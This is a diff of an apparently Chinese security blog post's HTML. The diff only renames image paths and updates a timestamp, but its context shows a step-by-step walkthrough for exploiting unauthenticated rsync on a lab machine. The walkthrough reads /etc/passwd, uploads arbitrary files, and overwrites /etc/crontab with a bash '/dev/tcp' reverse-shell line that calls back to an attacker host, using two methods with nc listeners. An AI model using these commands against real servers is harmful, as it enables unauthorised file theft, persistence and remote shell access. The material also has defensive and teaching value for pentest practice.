@@ -23,35 +23,35 @@
 <meta property="og:site_name" content="echozt">
 <meta property="og:description" content="关于rsync服务未授权漏洞的几种利用方式~~">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/3.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/3_2.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/3_3.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/4.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/4_2.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/5.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/5_2.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/6.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/6_2.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/6_3.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/6_4.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/7.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/7_2.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/7_3.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/7_4.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/7_5.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/7_6.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/7_7.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/7_8.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/7_9.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/3_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/3_3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/4.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/4_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/5.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/5_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/6.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/6_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/6_3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/6_4.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/7.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/7_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/7_3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/7_4.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/7_5.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/7_6.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/7_7.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/7_8.png">
+<meta property="og:image" content="https://echozt.github.io/posts/7e0e/7_9.png">
 <meta property="article:published_time" content="2022-12-06T08:18:17.000Z">
-<meta property="article:modified_time" content="2022-12-06T08:48:29.193Z">
+<meta property="article:modified_time" content="2022-12-06T08:49:07.035Z">
 <meta property="article:author" content="echozt">
 <meta property="article:tag" content="未授权访问">
 <meta property="article:tag" content="任意文件上传">
 <meta property="article:tag" content="任意文件下载">
 <meta property="article:tag" content="计划任务反弹shell">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://echozt.github.io/posts/undefined/3.png">
+<meta name="twitter:image" content="https://echozt.github.io/posts/7e0e/3.png">
   
   
   <title>rsync未授权访问漏洞利用 - echozt</title>
@@ -287,34 +287,34 @@
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h1 id="00x3-漏洞验证"><a href="#00x3-漏洞验证" class="headerlink" title="00x3 漏洞验证"></a>00x3 漏洞验证</h1><h3 id="1、在kali上扫描靶机端口，可以看到873端口开放"><a href="#1、在kali上扫描靶机端口，可以看到873端口开放" class="headerlink" title="1、在kali上扫描靶机端口，可以看到873端口开放"></a>1、在kali上扫描靶机端口，可以看到873端口开放</h3><pre class="line-numbers language-bash"><code class="language-bash">nmap -sS 192.158.25.129
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="/posts/undefined/3.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/3.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="2、查看目录，若能查看到目录，则说明漏洞存在"><a href="#2、查看目录，若能查看到目录，则说明漏洞存在" class="headerlink" title="2、查看目录，若能查看到目录，则说明漏洞存在"></a>2、查看目录，若能查看到目录，则说明漏洞存在</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> 192.168.25.129::
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="/posts/undefined/3_2.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/3_2.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="3、查看目录下的文件"><a href="#3、查看目录下的文件" class="headerlink" title="3、查看目录下的文件"></a>3、查看目录下的文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> 192.168.25.129::src
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="/posts/undefined/3_3.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/3_3.png" srcset="/img/loading.gif" lazyload class>
 
 <h1 id="00x4-漏洞利用——任意文件下载"><a href="#00x4-漏洞利用——任意文件下载" class="headerlink" title="00x4 漏洞利用——任意文件下载"></a>00x4 漏洞利用——任意文件下载</h1><h3 id="1、下载目标靶机的任意文件，这里下载etc-passwd文件"><a href="#1、下载目标靶机的任意文件，这里下载etc-passwd文件" class="headerlink" title="1、下载目标靶机的任意文件，这里下载etc/passwd文件"></a>1、下载目标靶机的任意文件，这里下载etc/passwd文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av 192.168.25.129::src/etc/passwd /tmp
 
 （src/etc/passwd是目标内容，/tmp是自己指定存储在本地的路径）
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/undefined/4.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/4.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="2、查看下载的文件"><a href="#2、查看下载的文件" class="headerlink" title="2、查看下载的文件"></a>2、查看下载的文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> /tmp/passwd
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="/posts/undefined/4_2.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/4_2.png" srcset="/img/loading.gif" lazyload class>
 
 <h1 id="00x5-漏洞利用——任意文件上传"><a href="#00x5-漏洞利用——任意文件上传" class="headerlink" title="00x5 漏洞利用——任意文件上传"></a>00x5 漏洞利用——任意文件上传</h1><h3 id="1、上传任意文件到目标靶机"><a href="#1、上传任意文件到目标靶机" class="headerlink" title="1、上传任意文件到目标靶机"></a>1、上传任意文件到目标靶机</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av /home/kali/a.txt 192.168.25.129::src/tmp/a.txt
 
 （/home/kali/a.txt是攻击机上的文件路径，src/tmp/a.txt是指要上传到目标靶机的路径）
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p> <img src="/posts/undefined/5.png" srcset="/img/loading.gif" lazyload class></p>
+<p> <img src="/posts/7e0e/5.png" srcset="/img/loading.gif" lazyload class></p>
 <h3 id="2、查看是否上传成功"><a href="#2、查看是否上传成功" class="headerlink" title="2、查看是否上传成功"></a>2、查看是否上传成功</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> 192.168.25.129::src/tmp/
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p> <img src="/posts/undefined/5_2.png" srcset="/img/loading.gif" lazyload class></p>
+<p> <img src="/posts/7e0e/5_2.png" srcset="/img/loading.gif" lazyload class></p>
 <h1 id="00x6-漏洞利用——利用计划任务反弹shell"><a href="#00x6-漏洞利用——利用计划任务反弹shell" class="headerlink" title="00x6 漏洞利用——利用计划任务反弹shell"></a>00x6 漏洞利用——利用计划任务反弹shell</h1><h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>整体思路：</p>
 <p>（1）下载靶机的系统计划任务文件（目录为/etc/crontab）</p>
 <p>（2）修改下载好的计划任务文件，将命令写入其中</p>
@@ -322,19 +322,19 @@
 <p>（4）将修改好的计划任务crontab文件传回到靶机</p>
 <h3 id="1、下载Ubuntu靶机的系统计划任务文件到kali的root目录下"><a href="#1、下载Ubuntu靶机的系统计划任务文件到kali的root目录下" class="headerlink" title="1、下载Ubuntu靶机的系统计划任务文件到kali的root目录下"></a>1、下载Ubuntu靶机的系统计划任务文件到kali的root目录下</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av 192.168.25.129::src/etc/crontab /root
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="/posts/undefined/6.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/6.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="2、在下载好的crontab中写入计划任务"><a href="#2、在下载好的crontab中写入计划任务" class="headerlink" title="2、在下载好的crontab中写入计划任务"></a>2、在下载好的crontab中写入计划任务</h3><pre class="line-numbers language-bash"><code class="language-bash">*/1 * * * * root <span class="token function">bash</span> -c <span class="token string">"bash -i >&amp; /dev/tcp/192.168.25.128/11111 0>&amp;1"</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="/posts/undefined/6_2.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/6_2.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="3、在kali上开启监听端口"><a href="#3、在kali上开启监听端口" class="headerlink" title="3、在kali上开启监听端口"></a>3、在kali上开启监听端口</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -lvnp 11111
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h3 id="4、将修改好的crontab文件传回到靶机系统计划任务目录-etc-crontab中"><a href="#4、将修改好的crontab文件传回到靶机系统计划任务目录-etc-crontab中" class="headerlink" title="4、将修改好的crontab文件传回到靶机系统计划任务目录/etc/crontab中"></a>4、将修改好的crontab文件传回到靶机系统计划任务目录/etc/crontab中</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av <span class="token function">crontab</span> 192.168.25.129::src/etc/crontab
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="/posts/undefined/6_3.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/6_3.png" srcset="/img/loading.gif" lazyload class>
 
-<h3 id="5、反弹shell成功"><a href="#5、反弹shell成功" class="headerlink" title="5、反弹shell成功"></a>5、反弹shell成功</h3><img src="/posts/undefined/6_4.png" srcset="/img/loading.gif" lazyload class>
+<h3 id="5、反弹shell成功"><a href="#5、反弹shell成功" class="headerlink" title="5、反弹shell成功"></a>5、反弹shell成功</h3><img src="/posts/7e0e/6_4.png" srcset="/img/loading.gif" lazyload class>
 
 <h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>    利用方法一就好了，方法二跟方法一差不多，就是将反弹命令写入到sh文件了。</p>
 <p>整体思路：</p>
@@ -350,39 +350,39 @@
 
 查看是否写入成功：cat 111.sh
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/undefined/7.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/7.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="2、赋予执行权限"><a href="#2、赋予执行权限" class="headerlink" title="2、赋予执行权限"></a>2、赋予执行权限</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chmod</span> +x 111l.sh
 
 查看权限是否赋予成功：ls -l 111s.sh
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/undefined/7_2.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/7_2.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="3、将反弹shell文件上传到攻击者目录下"><a href="#3、将反弹shell文件上传到攻击者目录下" class="headerlink" title="3、将反弹shell文件上传到攻击者目录下"></a>3、将反弹shell文件上传到攻击者目录下</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av 111.sh 192.168.25.129::src/tmp/111.sh
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="/posts/undefined/7_3.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/7_3.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="4、查看是否上传成功"><a href="#4、查看是否上传成功" class="headerlink" title="4、查看是否上传成功"></a>4、查看是否上传成功</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> 192.168.25.129::src/tmp/
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="/posts/undefined/7_4.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/7_4.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="5、下载对方定时任务文件crontab到-root目录下"><a href="#5、下载对方定时任务文件crontab到-root目录下" class="headerlink" title="5、下载对方定时任务文件crontab到/root目录下"></a>5、下载对方定时任务文件crontab到/root目录下</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av 192.168.25.129::src/etc/crontab /root
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="/posts/undefined/7_5.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/7_5.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="6、在crontab文件末尾写入命令"><a href="#6、在crontab文件末尾写入命令" class="headerlink" title="6、在crontab文件末尾写入命令"></a>6、在crontab文件末尾写入命令</h3><pre class="line-numbers language-bash"><code class="language-bash">*/1 * * * * root /tmp/111.sh
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>    保存并退出</p>
-<img src="/posts/undefined/7_6.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/7_6.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="7、设置监听端口"><a href="#7、设置监听端口" class="headerlink" title="7、设置监听端口"></a>7、设置监听端口</h3><p>    在kali上另外开一个命令行窗口，监听9999端口：nc -lvnp 9999</p>
-<img src="/posts/undefined/7_7.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/7_7.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="8、将crontab文件上传到目标靶机"><a href="#8、将crontab文件上传到目标靶机" class="headerlink" title="8、将crontab文件上传到目标靶机"></a>8、将crontab文件上传到目标靶机</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av <span class="token function">crontab</span> 192.168.25.129::src/etc/crontab
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="/posts/undefined/7_8.png" srcset="/img/loading.gif" lazyload class>
+<img src="/posts/7e0e/7_8.png" srcset="/img/loading.gif" lazyload class>
 
-<h3 id="9、在监听端口处可以看到成功获得反弹shell"><a href="#9、在监听端口处可以看到成功获得反弹shell" class="headerlink" title="9、在监听端口处可以看到成功获得反弹shell"></a>9、在监听端口处可以看到成功获得反弹shell</h3><img src="/posts/undefined/7_9.png" srcset="/img/loading.gif" lazyload class>
+<h3 id="9、在监听端口处可以看到成功获得反弹shell"><a href="#9、在监听端口处可以看到成功获得反弹shell" class="headerlink" title="9、在监听端口处可以看到成功获得反弹shell"></a>9、在监听端口处可以看到成功获得反弹shell</h3><img src="/posts/7e0e/7_9.png" srcset="/img/loading.gif" lazyload class>
 
             </div>
             <hr>
